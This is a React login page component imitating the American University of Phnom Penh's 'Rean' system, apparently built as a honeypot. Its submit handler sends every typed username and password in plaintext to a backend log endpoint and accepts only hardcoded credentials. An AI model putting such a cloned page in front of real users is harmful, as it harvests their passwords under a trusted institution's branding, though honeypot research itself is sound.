import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import fall from '../assets/fall.png';
import mptc from '../assets/mptc.png';
import rean from '../assets/rean.png';
import aupp_logo from '../assets/aupp_logo.png';
import microsoft_logo from '../assets/microsoft_logo.png';
import google_logo from '../assets/google_logo.png';
import "./Login.css"
import "bootstrap/dist/css/bootstrap.min.css";
import 'bootstrap/scss/bootstrap.scss';

const BACKEND = import.meta.env?.VITE_BACKEND_URL || "http://localhost:5000";

export default function Login() {
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e) => {
  e.preventDefault();

  const isCorrect = username === "honeypot hotpot" && password === "hotpot";

  try {
    await fetch(`${BACKEND}/log`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username,
        password,
        status: isCorrect ? "SUCCESS" : "FAILED",
        timestamp: new Date().toISOString(),
      }),
    });

    if (isCorrect) {
      navigate("/home");
      return;
    }

    // If incorrect, show error message
    setMsg("Invalid username or password");
    setPassword("");
    setUsername("");
  } catch (err) {
    setMsg("Network error");
    console.error(err);
  }
};

  return (
    <div className="login-container_camu">
      <div className="row login-full-container m-0 px-[16%] py-[34px]">

        {/* Left Section */}
        <div className="col-lg-6 left-grid">
          <div className="left-back-img"></div>

          <div className="login-details-left">
            <div className="login-banner_view">
              <div className="left-banner-section mb-4">
                <div id="login-box" className="no_margin login-banner-box mainblock visible m-0">
                  <img src={fall} alt="Fall"/>
                </div>
              </div>
              <p className="university-text text-white flex text-center">University Management System</p>
              <p className="explain-text text-white flex text-center">
                Prioritize user expertience by creating an intuitive interface that is easy to navigate, ensuring quick and hassie-free access to the system
              </p>
            </div>

            <div className="user-account_cont">
              <p className="more-login_label">
                <span>Prepared by</span>
              </p>
            </div>

            <div className="row justify-content-center">
              <div className="col-md-5 col-lg-5 flex align-content-center">
                <img src={mptc} alt="Mptc"/>
              </div>
              <div className="col-md-2 col-lg-2 divided">
                <span></span>
              </div>
              <div className="col-md-5 col-lg-5 white-img">
                <img src={rean} alt="Rean"/>
              </div>
            </div>
          </div>
        </div>

        {/* Right Section */}
        <div className="col-lg-6 d-flex flex-column justify-content-center align-items-center position-relative bg-white p-4">

          {/* Top Right Create Account */}
          <div className="position-absolute" style={{top:'15px', right:'20px'}}>
            <span style={{ color: 'black' }} className="me-2">New to Rean?</span>
            <button className="btn btn-sm fw-bold btn-outline-secondary">
              Create an account
            </button>
          </div>

          {/* Login Box */}
          <div className="w-100 mt-5" style={{ maxWidth: "400px" }}>
            <div className="text-center mb-4">
              <img
                src={aupp_logo}
                alt="AUPP Logo"
                style={{ height: "143px", width:"130px" }}
                className="mb-2"
              />
              <h5 className="fw-semibold mb-1">American University of Phnom Penh</h5>
              <a href="#" className="small text-decoration-none fw-bold" style={{color:"#274BAB"}}>
                Not from American University of Phnom Penh?
              </a>
            </div>

            <h5 className="mb-3 fw-bold text-center">Login to Rean</h5>

            <form onSubmit={handleSubmit}>
              <div className="mb-3">
                <label className="form-label">User name</label>
                <input
                  type="text"
                  className="form-control"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                />
              </div>

              <div className="mb-2">
                <label className="form-label">Password</label>
                <div className="position-relative">
                  <input
                    type={showPassword ? "text" : "password"} 
                    className="form-control pe-5"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />

                  <button
                    type="button"
                    className="btn btn-link position-absolute top-50 end-0 translate-middle-y text-decoration-none text-muted"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{ border: 'none', background: 'none', fontSize: '0.8rem' }}
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
              </div>

              <div className="text-end mb-3">
                <a href="#" className="small text-primary text-decoration-none">
                  Forgot password?
                </a>
              </div>

              {msg && <p className="text-danger text-center">{msg}</p>}

              <button 
                type="submit" 
                className="btn custom-login-btn w-100 mb-3"
                style={{
                  backgroundColor: '#274BAB',
                  borderColor: '#274BAB',
                  color: 'white'
                }}>
                Login
              </button>
            </form>

            <div className="text-center text-muted mb-3">OR</div>

            <div className="d-grid gap-2">
              <button className="btn btn-light w-100">
                <img src={google_logo} alt="Google" className="me-2" style={{ width: '25px', height: '25px' }} />
                Continue with Google
              </button>

              <button className="btn btn-light w-100">
                <img src={microsoft_logo} alt="Microsoft" className="me-2" style={{ width: '30px', height: '30px' }} />
                Continue with Microsoft
              </button>
            </div>

            <p className="text-center small text-muted mt-4 mb-0">
              2024 © University Technologies. All Rights Reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}